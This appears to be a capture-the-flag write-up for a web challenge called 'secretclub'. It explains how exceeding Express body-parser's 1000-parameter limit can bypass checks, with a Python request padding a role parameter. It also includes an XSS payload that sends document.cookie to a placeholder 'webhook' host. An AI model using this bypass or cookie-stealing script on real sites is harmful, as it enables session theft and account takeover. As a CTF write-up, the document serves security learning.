# Web - secretclub

Express has a default limit on the number of parameters it accepts in a 
single request. This limit is set to 1000 by default. 
For more details, refer to the [Express body-parser documentation](https://github.com/expressjs/body-parser#parameterlimit).

By crafting a request with more than 1000 parameters, 
you can potentially bypass some internal checks, 
leading to unintended behavior.

Here's an example that demonstrates how to craft a request with more than 1000 parameters using Python's `requests` library:

```py
import requests

print(requests.get(f'https://secretclub.1337.sb?role=123{"&"*999}'))
```

To exploit this vulnerability, 
you could attempt to send a payload that changes 
the user's role and injects a script to send `document.cookie`
to a remote server. Here's an example of a payload that could 
be used to achieve this:

```js
<script>
    fetch(`http://webhook/?${encodeURIComponent(document.cookie)}`)
</script>
```
